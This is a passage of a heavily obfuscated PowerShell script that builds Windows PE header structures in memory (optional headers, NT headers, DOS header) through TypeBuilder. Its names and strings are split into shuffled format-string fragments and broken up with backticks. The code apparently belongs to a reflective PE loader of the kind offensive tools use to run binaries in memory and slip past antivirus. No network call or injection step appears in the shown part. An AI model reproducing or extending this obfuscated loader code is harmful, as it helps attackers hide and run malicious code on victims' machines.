		(${typ`e`Bui`LDER}.("{2}{3}{0}{1}" -f 'e','ld','De','fineFi').Invoke(("{2}{0}{1}{3}"-f 't','ackComm','SizeOfS','it'), [UInt64], ("{0}{1}"-f 'P','ublic'))).("{1}{0}{2}"-f'fs','SetOf','et').Invoke(80) | &("{0}{2}{1}" -f'Ou','l','t-Nul')
		(${TypEb`UI`L`Der}.("{1}{3}{2}{0}"-f'eld','De','Fi','fine').Invoke(("{4}{0}{3}{1}{2}" -f 'apRes','v','e','er','SizeOfHe'), [UInt64], ("{0}{1}"-f 'Publi','c'))).("{2}{0}{1}"-f 'etO','ffset','S').Invoke(88) | &("{1}{0}{2}"-f 'ul','Out-N','l')
		(${T`Y`PEB`UiLDER}.("{2}{0}{1}" -f 'in','eField','Def').Invoke(("{3}{2}{0}{1}" -f 'omm','it','C','SizeOfHeap'), [UInt64], ("{1}{2}{0}" -f 'lic','P','ub'))).("{0}{2}{1}"-f'Set','ffset','O').Invoke(96) | &("{2}{0}{1}" -f'ut-N','ull','O')
		(${typeBuI`l`DeR}.("{1}{0}{2}" -f'ineFiel','Def','d').Invoke(("{0}{2}{1}"-f'L','s','oaderFlag'), [UInt32], ("{0}{1}" -f 'Pub','lic'))).("{2}{3}{1}{0}"-f 't','ffse','S','etO').Invoke(104) | &("{2}{0}{1}" -f 'N','ull','Out-')
		(${T`YPebu`i`LDER}.("{3}{2}{0}{1}" -f'eF','ield','in','Def').Invoke(("{3}{5}{6}{0}{2}{4}{1}"-f 'er','s','O','N','fRvaAndSize','u','mb'), [UInt32], ("{1}{0}"-f'ublic','P'))).("{1}{2}{0}" -f't','S','etOffse').Invoke(108) | &("{0}{1}" -f 'Out-Nul','l')
		(${T`YpEb`Ui`LDER}.("{1}{3}{2}{0}" -f 'd','Define','el','Fi').Invoke(("{0}{2}{1}" -f 'Expo','le','rtTab'), ${imaGE_D`ATA_diRE`CT`O`RY}, ("{0}{2}{1}" -f 'P','blic','u'))).("{2}{1}{0}" -f 'et','s','SetOff').Invoke(112) | &("{1}{2}{0}"-f'l','Out','-Nul')
		(${T`y`PEb`UILdeR}.("{0}{1}{2}"-f'Defin','e','Field').Invoke(("{0}{2}{1}"-f 'Imp','le','ortTab'), ${i`maGE_Dat`A_dir`eCTO`Ry}, ("{0}{1}"-f 'Publi','c'))).("{1}{0}{2}"-f'f','SetOf','set').Invoke(120) | &("{1}{2}{0}" -f'-Null','Ou','t')
		(${type`B`Uil`DEr}.("{1}{0}{2}{3}" -f 'i','Def','neFiel','d').Invoke(("{1}{0}{2}" -f'esourceTa','R','ble'), ${Im`AGE_`daT`A_D`IRECt`ORY}, ("{0}{1}"-f'Publ','ic'))).("{0}{2}{1}" -f'Set','t','Offse').Invoke(128) | &("{1}{0}"-f 'ull','Out-N')
		(${tYPe`B`UILder}.("{2}{0}{1}" -f 'iel','d','DefineF').Invoke(("{0}{2}{1}" -f 'E','eptionTable','xc'), ${I`MaG`E_`DATa_`DIrEc`TorY}, ("{1}{2}{0}"-f'c','Publ','i'))).("{2}{1}{0}"-f 'set','f','SetOf').Invoke(136) | &("{1}{0}" -f '-Null','Out')
		(${T`YPeBU`Il`Der}.("{1}{2}{0}{3}" -f 'el','DefineF','i','d').Invoke(("{3}{1}{2}{0}"-f 'Table','ifica','te','Cert'), ${IM`Age`_DaT`A_di`ReCtoRY}, ("{1}{0}" -f 'ic','Publ'))).("{0}{1}" -f'SetOf','fset').Invoke(144) | &("{1}{0}" -f 'Null','Out-')
		(${tYPEBU`i`L`der}.("{1}{3}{2}{0}" -f 'd','De','neFiel','fi').Invoke(("{1}{5}{0}{2}{3}{4}"-f 'locat','Ba','io','nTab','le','seRe'), ${I`maGe`_`DA`Ta_DIrE`CtOrY}, ("{2}{1}{0}" -f'ic','ubl','P'))).("{0}{1}{2}"-f'Set','Offs','et').Invoke(152) | &("{2}{0}{1}"-f 'u','ll','Out-N')
		(${TYPEbu`i`lDEr}.("{0}{2}{1}{3}" -f 'D','neFie','efi','ld').Invoke(("{1}{0}"-f 'g','Debu'), ${i`MAgE_D`A`TA_d`i`ReCTOry}, ("{0}{2}{1}" -f 'Publ','c','i'))).("{1}{0}{2}"-f'fse','SetOf','t').Invoke(160) | &("{0}{1}{2}" -f 'Out-N','u','ll')
		(${ty`PE`B`UIlder}.("{1}{2}{0}" -f'eld','Defi','neFi').Invoke(("{0}{1}{2}" -f 'Archit','ectu','re'), ${imA`G`E_d`A`TA_diRE`cTORy}, ("{1}{2}{0}"-f'c','Pub','li'))).("{0}{1}" -f'SetOffs','et').Invoke(168) | &("{1}{0}" -f 'll','Out-Nu')
		(${t`ypEbui`LDeR}.("{1}{0}{2}{3}" -f'fineFi','De','el','d').Invoke(("{1}{0}{2}" -f'obalPt','Gl','r'), ${IM`A`GE_`d`AtA`_d`iREctORY}, ("{0}{1}{2}"-f'Pub','l','ic'))).("{2}{0}{1}" -f 'f','set','SetOf').Invoke(176) | &("{1}{0}{2}"-f 'ut-','O','Null')
		(${t`ypE`BUildEr}.("{0}{1}{2}" -f 'D','efin','eField').Invoke(("{2}{1}{0}"-f'le','LSTab','T'), ${I`MA`ge_d`AtA_dIRECt`oRY}, ("{1}{0}{2}"-f 'u','P','blic'))).("{2}{0}{3}{1}" -f'e','ffset','S','tO').Invoke(184) | &("{1}{0}"-f '-Null','Out')
		(${TYpEbui`Ld`eR}.("{1}{2}{0}"-f 'Field','Defi','ne').Invoke(("{0}{4}{1}{2}{3}"-f'LoadCon','i','gTab','le','f'), ${imAGe`_DaTA_diR`Ec`TOrY}, ("{1}{0}{2}" -f 'ubli','P','c'))).("{0}{1}"-f'S','etOffset').Invoke(192) | &("{1}{0}"-f '-Null','Out')
		(${TY`PeBu`IlDer}.("{0}{2}{1}"-f 'D','ield','efineF').Invoke(("{2}{1}{0}" -f 'dImport','un','Bo'), ${ImA`Ge_`DATa_DI`Re`C`To`Ry}, ("{1}{0}" -f 'blic','Pu'))).("{1}{0}{2}" -f 'tO','Se','ffset').Invoke(200) | &("{1}{2}{0}" -f'll','Out','-Nu')
		(${TypE`B`UILd`eR}.("{1}{2}{0}" -f'neField','D','efi').Invoke('IAT', ${imaGE`_DATa_Dir`e`C`T`o`Ry}, ("{0}{1}" -f 'Pu','blic'))).("{2}{1}{0}" -f 'et','Offs','Set').Invoke(208) | &("{0}{1}" -f'O','ut-Null')
		(${tY`pebu`ildEr}.("{0}{2}{1}{3}"-f'Defi','l','neFie','d').Invoke(("{6}{1}{5}{3}{2}{4}{0}"-f 'riptor','e','por','yIm','tDesc','la','D'), ${IMAgE`_d`ATA_`Dire`CTO`RY}, ("{1}{0}"-f'c','Publi'))).("{2}{0}{1}" -f'Of','fset','Set').Invoke(216) | &("{0}{1}"-f'O','ut-Null')
		(${tYp`EBUi`ld`ER}.("{0}{2}{1}{3}"-f'De','neFi','fi','eld').Invoke(("{3}{2}{1}{0}" -f'ader','He','Runtime','CLR'), ${im`AG`e_Dat`A_dir`EcToRy}, ("{1}{0}" -f'c','Publi'))).("{0}{1}" -f 'SetOf','fset').Invoke(224) | &("{1}{0}{2}"-f'-','Out','Null')
		(${Type`BUI`LDeR}.("{1}{0}{2}" -f 'fineF','De','ield').Invoke(("{0}{1}" -f 'R','eserved'), ${IMa`G`e_d`AT`A_dIRECToRy}, ("{1}{0}"-f'ublic','P'))).("{2}{3}{0}{1}" -f 'se','t','Set','Off').Invoke(232) | &("{1}{0}{2}"-f'Nul','Out-','l')
		${image_Op`T`I`o`Na`L_HEaDer64} = ${tyPEb`Uil`D`Er}.("{1}{0}{2}"-f'T','Create','ype').Invoke()
		${WIN3`2`TyPes} | &("{0}{1}{2}{3}" -f 'Ad','d','-Mem','ber') -MemberType ("{0}{1}{2}" -f'NotePr','ope','rty') -Name ("{3}{4}{6}{0}{1}{2}{5}"-f'E','AD','E','IMAGE_','OPTIONAL_','R64','H') -Value ${ima`Ge`_op`TionAL_`HeaDe`R64}

		
		${att`R`iB`UTEs} = ("{2}{8}{7}{12}{0}{9}{3}{6}{4}{10}{11}{1}{5}" -f'Class','d','Aut','xpl','aled, ','Init','icitLayout, Se',', AnsiClas','oLayout',', Public, E','BeforeFi','el','s, ')
		${ty`PEbUILD`er} = ${MoD`U`Leb`UiLDer}.("{0}{2}{1}{3}"-f'D','fine','e','Type').Invoke(("{2}{0}{3}{4}{1}" -f'_OP','ER32','IMAGE','TIONAL_','HEAD'), ${aTT`R`IbUTes}, [System.ValueType], 224)
		(${typEb`Uild`eR}.("{1}{3}{2}{0}" -f'd','Def','iel','ineF').Invoke(("{1}{0}" -f'gic','Ma'), ${m`A`gICT`Ype}, ("{1}{0}"-f'ic','Publ'))).("{1}{2}{0}" -f'et','SetOf','fs').Invoke(0) | &("{2}{1}{0}"-f'ull','t-N','Ou')
		(${tyPE`B`Ui`LdeR}.("{2}{1}{0}"-f'ld','e','DefineFi').Invoke(("{3}{4}{1}{0}{2}" -f 'nkerVe','i','rsion','Ma','jorL'), [Byte], ("{1}{2}{0}"-f'c','Pub','li'))).("{0}{1}" -f 'SetO','ffset').Invoke(2) | &("{2}{0}{1}"-f '-Nul','l','Out')
		(${TY`P`e`BUilDeR}.("{2}{1}{0}"-f'Field','e','Defin').Invoke(("{1}{3}{4}{0}{2}"-f'r','Mi','Version','no','rLinke'), [Byte], ("{0}{1}"-f 'P','ublic'))).("{0}{1}" -f 'Set','Offset').Invoke(3) | &("{2}{0}{1}"-f'ut-Nu','ll','O')
		(${tY`pE`BU`ILDEr}.("{3}{2}{0}{1}"-f'i','eld','ineF','Def').Invoke(("{2}{0}{1}"-f'fCod','e','SizeO'), [UInt32], ("{0}{2}{1}" -f 'P','blic','u'))).("{0}{1}{2}" -f 'SetOf','f','set').Invoke(4) | &("{0}{1}{2}" -f'Out-Nu','l','l')
		(${tYp`e`BUIlD`Er}.("{2}{3}{1}{0}"-f 'd','l','D','efineFie').Invoke(("{4}{2}{3}{1}{5}{0}"-f'a','zedD','OfI','nitiali','Size','at'), [UInt32], ("{1}{0}"-f'lic','Pub'))).("{3}{2}{0}{1}"-f 'fse','t','tOf','Se').Invoke(8) | &("{0}{2}{1}"-f 'Ou','-Null','t')
		(${t`y`PEbui`LdEr}.("{0}{2}{1}" -f'Defin','Field','e').Invoke(("{4}{3}{1}{5}{0}{2}" -f 'alize','n','dData','U','SizeOf','initi'), [UInt32], ("{1}{0}" -f 'c','Publi'))).("{1}{2}{0}"-f'fset','S','etOf').Invoke(12) | &("{0}{1}" -f 'Out-Nu','ll')
		(${TYPeB`Ui`LdER}.("{1}{3}{2}{0}" -f'eld','D','i','efineF').Invoke(("{1}{2}{4}{5}{0}{3}"-f'oi','A','dd','nt','ressOfEntry','P'), [UInt32], ("{0}{1}" -f 'Pub','lic'))).("{1}{2}{0}"-f'set','Se','tOff').Invoke(16) | &("{1}{0}"-f'l','Out-Nul')
		(${TypEb`U`ildeR}.("{1}{0}{2}" -f'efi','D','neField').Invoke(("{0}{3}{2}{1}"-f'B','e','Cod','aseOf'), [UInt32], ("{0}{1}" -f'Pu','blic'))).("{1}{3}{0}{2}" -f 'Of','Se','fset','t').Invoke(20) | &("{2}{0}{1}" -f'-Nul','l','Out')
		(${TY`PeBUIl`dER}.("{1}{0}{2}" -f'efi','D','neField').Invoke(("{0}{2}{1}" -f'Ba','ta','seOfDa'), [UInt32], ("{0}{1}"-f 'Publi','c'))).("{2}{0}{1}" -f 'Offse','t','Set').Invoke(24) | &("{2}{1}{0}"-f 'l','l','Out-Nu')
		(${t`YPe`BUiLd`eR}.("{0}{2}{1}" -f 'Defin','Field','e').Invoke(("{1}{0}"-f'se','ImageBa'), [UInt32], ("{0}{1}"-f 'P','ublic'))).("{1}{2}{0}" -f'Offset','Se','t').Invoke(28) | &("{0}{1}" -f'Out-Nu','ll')
		(${ty`PEbUiLd`er}.("{0}{2}{1}"-f 'Def','d','ineFiel').Invoke(("{0}{3}{1}{2}"-f'Secti','ignme','nt','onAl'), [UInt32], ("{1}{2}{0}"-f 'ic','Pu','bl'))).("{2}{1}{0}" -f't','tOffse','Se').Invoke(32) | &("{0}{1}" -f'Ou','t-Null')
		(${TYp`ebUi`L`der}.("{3}{1}{0}{2}" -f 'el','Fi','d','Define').Invoke(("{0}{3}{1}{4}{2}" -f 'Fi','e','ent','l','Alignm'), [UInt32], ("{2}{1}{0}"-f 'lic','b','Pu'))).("{1}{0}{2}" -f 'ff','SetO','set').Invoke(36) | &("{1}{2}{0}" -f'l','Out','-Nul')
		(${TyPEb`Ui`LDer}.("{1}{0}{2}"-f'fineFi','De','eld').Invoke(("{3}{0}{1}{2}{4}"-f 'peratingSy','ste','mVersio','MajorO','n'), [UInt16], ("{0}{1}"-f'Publi','c'))).("{2}{0}{1}" -f 'tOffse','t','Se').Invoke(40) | &("{0}{1}" -f 'O','ut-Null')
		(${tyPEBu`I`l`DeR}.("{0}{2}{3}{1}"-f 'D','eField','ef','in').Invoke(("{7}{0}{2}{4}{5}{3}{6}{1}" -f'rOp','on','er','ste','atingS','y','mVersi','Mino'), [UInt16], ("{1}{0}" -f'blic','Pu'))).("{2}{3}{1}{0}" -f 't','se','SetO','ff').Invoke(42) | &("{1}{0}"-f't-Null','Ou')
		(${t`YpeB`UILDeR}.("{0}{1}{2}" -f 'DefineFi','el','d').Invoke(("{4}{2}{1}{5}{3}{0}" -f'n','eVe','Imag','sio','Major','r'), [UInt16], ("{0}{1}" -f'Publi','c'))).("{1}{2}{0}"-f 'set','Set','Off').Invoke(44) | &("{1}{0}" -f't-Null','Ou')
		(${TypEbUIl`D`eR}.("{3}{2}{1}{0}"-f'd','iel','F','Define').Invoke(("{0}{3}{1}{4}{2}" -f 'MinorIm','e','n','ageV','rsio'), [UInt16], ("{0}{1}" -f 'P','ublic'))).("{0}{1}{2}" -f 'SetO','ffs','et').Invoke(46) | &("{0}{1}"-f'Out-Nu','ll')
		(${tY`PEbuI`LDeR}.("{3}{1}{2}{0}" -f'ld','f','ineFie','De').Invoke(("{2}{1}{5}{3}{0}{4}"-f'emVersio','orSu','Maj','t','n','bsys'), [UInt16], ("{1}{0}" -f'blic','Pu'))).("{0}{1}{2}" -f'Se','tOf','fset').Invoke(48) | &("{1}{0}" -f 'll','Out-Nu')
		(${TYP`e`BuiLdER}.("{0}{2}{1}"-f'Def','d','ineFiel').Invoke(("{0}{2}{3}{1}{4}"-f'Minor','s','Subsyste','mVer','ion'), [UInt16], ("{1}{0}"-f 'c','Publi'))).("{2}{1}{0}"-f 'et','etOffs','S').Invoke(50) | &("{1}{0}{2}"-f 'ut-Nul','O','l')
		(${tY`pebuiLd`ER}.("{1}{2}{0}"-f'ld','Defin','eFie').Invoke(("{0}{1}{3}{2}"-f 'Wi','n32Ver','Value','sion'), [UInt32], ("{0}{2}{1}" -f 'Pub','c','li'))).("{0}{2}{1}" -f 'Se','fset','tOf').Invoke(52) | &("{2}{0}{1}" -f 'l','l','Out-Nu')
		(${T`YPe`Bu`iLDER}.("{1}{2}{0}"-f 'ld','Define','Fie').Invoke(("{1}{0}{2}" -f'eO','Siz','fImage'), [UInt32], ("{1}{2}{0}"-f'c','Pu','bli'))).("{1}{2}{0}" -f'tOffset','S','e').Invoke(56) | &("{0}{2}{1}" -f 'Out','l','-Nul')
		(${T`ypE`BUiLDer}.("{1}{3}{2}{0}" -f 'ld','Def','Fie','ine').Invoke(("{2}{0}{1}"-f'fHead','ers','SizeO'), [UInt32], ("{1}{0}"-f'c','Publi'))).("{3}{0}{2}{1}"-f'e','t','tOffse','S').Invoke(60) | &("{2}{0}{1}"-f '-Nul','l','Out')
		(${tYPeB`U`IL`DEr}.("{0}{1}{2}" -f'Defin','eF','ield').Invoke(("{1}{0}{2}" -f 'u','CheckS','m'), [UInt32], ("{2}{1}{0}"-f'ic','l','Pub'))).("{1}{2}{0}"-f 'et','S','etOffs').Invoke(64) | &("{0}{2}{1}" -f 'O','t-Null','u')
		(${Ty`PEBui`LDER}.("{2}{0}{1}" -f 'ie','ld','DefineF').Invoke(("{1}{2}{0}" -f 'bsystem','S','u'), ${Su`BSyst`emT`yPe}, ("{0}{1}"-f 'Pu','blic'))).("{0}{1}{2}{3}"-f 'S','etO','f','fset').Invoke(68) | &("{0}{1}"-f'Out-Nu','ll')
		(${TypeBuI`lD`er}.("{1}{0}{2}"-f 'eFiel','Defin','d').Invoke(("{1}{2}{3}{0}" -f'racteristics','D','llCh','a'), ${D`lLcH`A`Racter`is`TiCStype}, ("{0}{1}{2}" -f'P','ubl','ic'))).("{0}{3}{1}{2}"-f'Set','fs','et','Of').Invoke(70) | &("{1}{2}{0}"-f 'ull','O','ut-N')
		(${TypeB`U`iLD`er}.("{0}{2}{1}{3}" -f 'D','ie','efineF','ld').Invoke(("{3}{2}{0}{1}" -f 'Reser','ve','eOfStack','Siz'), [UInt32], ("{0}{1}"-f 'Publi','c'))).("{2}{1}{0}"-f'et','etOffs','S').Invoke(72) | &("{0}{1}"-f'Out-N','ull')
		(${TyP`E`BUILd`ER}.("{2}{3}{1}{0}" -f 'ield','neF','D','efi').Invoke(("{0}{1}{3}{2}" -f 'S','izeOfStac','it','kComm'), [UInt32], ("{0}{1}"-f 'Pub','lic'))).("{2}{0}{1}"-f'f','fset','SetO').Invoke(76) | &("{0}{1}{2}" -f 'Out-N','ul','l')
		(${tyPeB`UILd`Er}.("{3}{2}{1}{0}"-f'ld','e','Fi','Define').Invoke(("{0}{3}{1}{2}" -f'Si','f','HeapReserve','zeO'), [UInt32], ("{1}{0}"-f 'blic','Pu'))).("{0}{1}"-f 'S','etOffset').Invoke(80) | &("{1}{0}"-f'ull','Out-N')
		(${T`yPeBUI`lder}.("{2}{1}{0}{3}"-f'fineFi','e','D','eld').Invoke(("{0}{1}{3}{2}" -f 'Size','OfHe','pCommit','a'), [UInt32], ("{1}{2}{0}"-f 'ic','Pu','bl'))).("{2}{1}{0}"-f 'fset','f','SetO').Invoke(84) | &("{1}{0}{2}" -f't','Ou','-Null')
		(${TypeB`U`IL`Der}.("{2}{1}{0}" -f'ld','ineFie','Def').Invoke(("{2}{0}{3}{1}" -f'aderFla','s','Lo','g'), [UInt32], ("{0}{1}"-f'Pu','blic'))).("{2}{0}{1}" -f 'etOff','set','S').Invoke(88) | &("{2}{1}{0}" -f 'ull','-N','Out')
		(${TY`pEb`UIlD`Er}.("{2}{1}{0}{3}"-f 'i','neF','Defi','eld').Invoke(("{2}{4}{1}{0}{3}"-f 'iz','vaAndS','Numb','es','erOfR'), [UInt32], ("{0}{1}{2}"-f'Pu','bli','c'))).("{0}{2}{1}{3}" -f'Se','fse','tOf','t').Invoke(92) | &("{1}{0}{2}" -f'ut-N','O','ull')
		(${Typ`e`Bu`ilDER}.("{0}{3}{1}{2}" -f 'D','Fi','eld','efine').Invoke(("{2}{1}{0}"-f'rtTable','o','Exp'), ${iMAGe_`Data_`Di`ReCtORy}, ("{0}{2}{1}" -f 'P','ic','ubl'))).("{2}{1}{0}"-f'Offset','et','S').Invoke(96) | &("{1}{0}{2}" -f'ut-Nu','O','ll')
		(${T`yPEBuiL`d`Er}.("{1}{0}{2}" -f'fineFi','De','eld').Invoke(("{0}{1}{2}"-f'Imp','o','rtTable'), ${IMAgE`_dA`TA`_DIrEcToRy}, ("{0}{2}{1}"-f 'Pub','ic','l'))).("{0}{1}{2}" -f'SetOf','f','set').Invoke(104) | &("{0}{2}{1}"-f'Out-','ll','Nu')
		(${tYP`Eb`Uil`DEr}.("{3}{1}{0}{2}"-f'ie','efineF','ld','D').Invoke(("{0}{1}{2}" -f'Resou','rc','eTable'), ${Im`AgE_d`A`Ta_`DiRecT`O`Ry}, ("{0}{2}{1}"-f 'P','c','ubli'))).("{1}{0}{2}" -f 'tOff','Se','set').Invoke(112) | &("{2}{0}{1}" -f'ut-Nu','ll','O')
		(${tyP`EBuiL`D`Er}.("{1}{2}{0}" -f 'ld','D','efineFie').Invoke(("{1}{0}{3}{2}"-f 'eptionT','Exc','ble','a'), ${IMa`GE_Da`TA_`di`RecTo`RY}, ("{1}{0}" -f 'blic','Pu'))).("{1}{2}{0}"-f 'set','Set','Off').Invoke(120) | &("{2}{1}{0}"-f'ull','ut-N','O')
		(${t`YpebuI`LDeR}.("{1}{2}{3}{0}"-f 'ield','Def','ine','F').Invoke(("{1}{3}{4}{2}{0}"-f 'e','Certi','l','fica','teTab'), ${imAge_d`ATa`_Di`RE`cTORy}, ("{2}{0}{1}"-f'li','c','Pub'))).("{0}{1}{2}"-f 'S','etOffs','et').Invoke(128) | &("{1}{2}{0}"-f 'l','Out','-Nul')
		(${T`yPE`BuildeR}.("{2}{0}{1}"-f 'i','eld','DefineF').Invoke(("{3}{1}{5}{2}{4}{0}"-f'Table','eRel','cat','Bas','ion','o'), ${iMa`GE`_daTa`_D`IrectoRY}, ("{1}{0}" -f 'c','Publi'))).("{1}{3}{0}{2}" -f 'se','SetOf','t','f').Invoke(136) | &("{2}{1}{0}" -f'ull','t-N','Ou')
		(${TYpe`B`UiLd`eR}.("{2}{0}{1}"-f'eF','ield','Defin').Invoke(("{1}{0}"-f 'bug','De'), ${I`MA`g`E`_DatA_dIreCTOry}, ("{0}{1}"-f'Pub','lic'))).("{1}{2}{0}" -f'fset','S','etOf').Invoke(144) | &("{1}{2}{0}" -f'ull','Out-','N')
		(${T`Ypebu`ilD`er}.("{3}{2}{1}{0}" -f 'eld','i','F','Define').Invoke(("{2}{1}{0}" -f 'e','tur','Architec'), ${i`magE`_daTa_diR`E`Ct`Ory}, ("{0}{1}" -f 'Publ','ic'))).("{0}{2}{1}{3}"-f 'Set','ff','O','set').Invoke(152) | &("{1}{2}{0}"-f 'll','Out-N','u')
		(${typ`e`BUi`ldeR}.("{2}{0}{1}"-f 'neFie','ld','Defi').Invoke(("{0}{2}{1}"-f 'Glo','alPtr','b'), ${ima`G`E_d`ATA_di`RectO`Ry}, ("{2}{1}{0}" -f'c','li','Pub'))).("{2}{0}{3}{1}"-f 'tOff','et','Se','s').Invoke(160) | &("{2}{1}{0}" -f'l','ut-Nul','O')
		(${T`yPeBUild`eR}.("{1}{0}{2}"-f 'Fiel','Define','d').Invoke(("{1}{0}"-f'e','TLSTabl'), ${I`mAgE`_D`ATA_D`ir`ect`oRy}, ("{0}{1}" -f 'Pub','lic'))).("{1}{2}{0}"-f 'et','Set','Offs').Invoke(168) | &("{1}{0}{2}"-f 't-Nu','Ou','ll')
		(${TYP`EbuI`LDER}.("{1}{3}{0}{2}"-f 'neFi','Def','eld','i').Invoke(("{4}{1}{3}{2}{0}"-f 'le','Conf','Tab','ig','Load'), ${i`MagE_DAT`A_D`I`REcT`ORY}, ("{0}{1}{2}" -f 'Publ','i','c'))).("{1}{2}{0}" -f'set','SetOf','f').Invoke(176) | &("{2}{1}{0}" -f 'ull','ut-N','O')
		(${tYP`ebuiL`d`Er}.("{3}{0}{1}{2}" -f 'e','fi','neField','D').Invoke(("{2}{1}{0}" -f 'rt','undImpo','Bo'), ${i`MaG`e_DaT`A_D`IrE`CTORy}, ("{0}{1}" -f 'Pu','blic'))).("{1}{0}"-f'Offset','Set').Invoke(184) | &("{0}{1}" -f 'Out','-Null')
		(${TY`PEbuiL`d`ER}.("{3}{2}{0}{1}" -f'eFie','ld','n','Defi').Invoke('IAT', ${iMA`gE`_dAT`A_`DIReC`TOry}, ("{0}{1}"-f'Publi','c'))).("{2}{0}{1}"-f'Off','set','Set').Invoke(192) | &("{2}{0}{1}" -f'N','ull','Out-')
		(${tYpe`BU`ilDEr}.("{0}{2}{3}{1}"-f'D','ield','e','fineF').Invoke(("{5}{2}{1}{3}{0}{4}" -f'crip','port','elayIm','Des','tor','D'), ${i`maGe_`DaTA`_d`IrE`c`Tory}, ("{2}{1}{0}" -f'c','li','Pub'))).("{2}{0}{1}"-f'O','ffset','Set').Invoke(200) | &("{1}{2}{0}" -f'Null','Ou','t-')
		(${TYPE`BU`il`dEr}.("{1}{0}{2}" -f 'e','Defin','Field').Invoke(("{2}{1}{0}" -f'meHeader','Runti','CLR'), ${imAgE_D`A`T`A_`DiR`eCTOrY}, ("{1}{2}{0}"-f'ic','P','ubl'))).("{0}{1}{2}" -f 'S','et','Offset').Invoke(208) | &("{1}{0}" -f 'ull','Out-N')
		(${tyPE`BuiLD`eR}.("{1}{2}{3}{0}"-f 'eld','Defin','eF','i').Invoke(("{1}{0}{2}" -f 'v','Reser','ed'), ${Im`Ag`E`_DA`TA_DI`RECt`oRy}, ("{0}{2}{1}"-f'Pub','ic','l'))).("{2}{1}{0}" -f't','e','SetOffs').Invoke(216) | &("{0}{1}{2}" -f 'Out-Nu','l','l')
		${imAGE`_Op`T`Io`NAL_headeR32} = ${ty`pEbU`Il`dEr}.("{2}{1}{0}" -f 'pe','teTy','Crea').Invoke()
		${Win3`2t`y`pEs} | &("{1}{2}{0}"-f'er','A','dd-Memb') -MemberType ("{1}{0}{2}" -f 'e','NoteProp','rty') -Name ("{2}{0}{1}{3}" -f'_OPTIONAL','_HEADE','IMAGE','R32') -Value ${iMag`e_OPtiOnAL_He`A`dER`32}

		
		${At`TRIbut`ES} = ("{3}{5}{1}{9}{6}{2}{13}{11}{4}{14}{10}{12}{7}{0}{8}" -f 'n','las','lLayo','Aut','d','oLayout, AnsiC','ss, Public, Sequentia','eforeFieldI','it','s, Cla',' ','le','B','ut, Sea',',')
		${TY`p`e`BUilDEr} = ${MoDUlE`B`Uil`DeR}.("{0}{2}{1}" -f'Defi','Type','ne').Invoke(("{1}{3}{0}{2}" -f 'HEADERS6','IMAGE_','4','NT_'), ${attRI`BU`Tes}, [System.ValueType], 264)
		${t`Y`PeBUiLD`eR}.("{1}{0}{2}" -f 'eF','Defin','ield').Invoke(("{0}{1}{2}" -f'S','ignat','ure'), [UInt32], ("{0}{2}{1}" -f'Publ','c','i')) | &("{0}{1}{2}"-f 'Out','-N','ull')
		${TY`pe`Buil`dEr}.("{0}{1}{3}{2}"-f 'De','fine','eld','Fi').Invoke(("{2}{0}{3}{1}" -f 'l','eader','Fi','eH'), ${IMAGE_FI`Le`_HE`AdeR}, ("{1}{0}" -f'c','Publi')) | &("{0}{1}{2}"-f 'Out-','Nul','l')
		${TyPEb`UiL`D`ER}.("{1}{0}{2}" -f'iel','DefineF','d').Invoke(("{3}{2}{0}{1}{4}" -f 'alHe','ad','tion','Op','er'), ${i`mA`Ge_op`TIO`NAl_H`e`ADe`R64}, ("{0}{1}" -f'Pu','blic')) | &("{1}{0}"-f'ull','Out-N')
		${iMAg`E_nT`_HeADE`RS64} = ${Ty`PEBu`IL`DeR}.("{1}{3}{0}{2}"-f 'yp','Crea','e','teT').Invoke()
		${w`i`N32Ty`pes} | &("{2}{0}{1}{3}" -f'-','Me','Add','mber') -MemberType ("{1}{0}{3}{2}" -f 'ote','N','erty','Prop') -Name ("{2}{4}{1}{3}{0}" -f'DERS64','_','IMAGE_','HEA','NT') -Value ${ImA`g`E_n`T_`HEAdErs64}
		
		
		${a`TTRIbu`T`eS} = ("{13}{7}{15}{9}{0}{3}{14}{18}{4}{10}{17}{12}{6}{11}{16}{5}{8}{1}{2}" -f 'si','ni','t','C',', Public, Seque','aled, B','y','utoL','eforeFieldI',', An','nt','out, S','La','A','lass, Cla','ayout','e','ial','ss')
		${tY`pe`Buil`dER} = ${Modu`Leb`UILdeR}.("{2}{1}{0}" -f'ype','neT','Defi').Invoke(("{1}{3}{2}{0}{4}"-f 'ERS','IMA','T_HEAD','GE_N','32'), ${AT`TriBU`Tes}, [System.ValueType], 248)
		${TypEBu`I`lD`er}.("{2}{1}{3}{0}"-f'ield','ne','Defi','F').Invoke(("{1}{2}{0}" -f 're','Signat','u'), [UInt32], ("{0}{1}" -f 'P','ublic')) | &("{2}{0}{1}"-f'ut-Nul','l','O')
		${tYp`E`BUildEr}.("{3}{1}{0}{2}"-f 'i','F','eld','Define').Invoke(("{1}{2}{0}" -f 'der','Fi','leHea'), ${iMA`gE_FIl`e_h`ead`er}, ("{2}{0}{1}" -f 'li','c','Pub')) | &("{2}{1}{0}" -f 'Null','-','Out')
		${TypeBUIL`d`ER}.("{1}{3}{2}{0}"-f'ield','De','eF','fin').Invoke(("{3}{0}{1}{2}" -f'nalHead','e','r','Optio'), ${iMAG`e_Op`TIonal`_he`AD`ER32}, ("{0}{1}" -f 'Publi','c')) | &("{1}{2}{0}" -f'-Null','O','ut')
		${ImaG`E_Nt_he`AdErS`32} = ${TYpebU`I`l`der}.("{0}{2}{1}" -f 'Crea','eType','t').Invoke()
		${w`IN3`2T`YPES} | &("{0}{1}{2}"-f'A','dd','-Member') -MemberType ("{0}{2}{1}" -f'N','y','otePropert') -Name ("{5}{1}{4}{2}{3}{0}" -f '32','G','_NT_HEADE','RS','E','IMA') -Value ${imaGe`_`N`T`_He`ADER`S32}

		
		${a`T`T`RibUTes} = ("{10}{7}{1}{11}{3}{2}{12}{13}{9}{0}{4}{8}{6}{5}" -f't',' An','s','ass, Cla',',',', BeforeFieldInit','ed','utoLayout,',' Seal','ialLayou','A','siCl','s, Public',', Sequent')
		${TYp`EBui`lDER} = ${M`O`DuLeb`UILD`ER}.("{2}{0}{1}"-f'Typ','e','Define').Invoke(("{1}{2}{0}{3}" -f 'S_HEADE','IMAGE_D','O','R'), ${A`TTRI`Bu`Tes}, [System.ValueType], 64)
		${typ`E`BuiLD`er}.("{0}{1}{2}"-f'De','f','ineField').Invoke(("{1}{0}"-f '_magic','e'), [UInt16], ("{0}{1}" -f'P','ublic')) | &("{0}{1}"-f 'O','ut-Null')
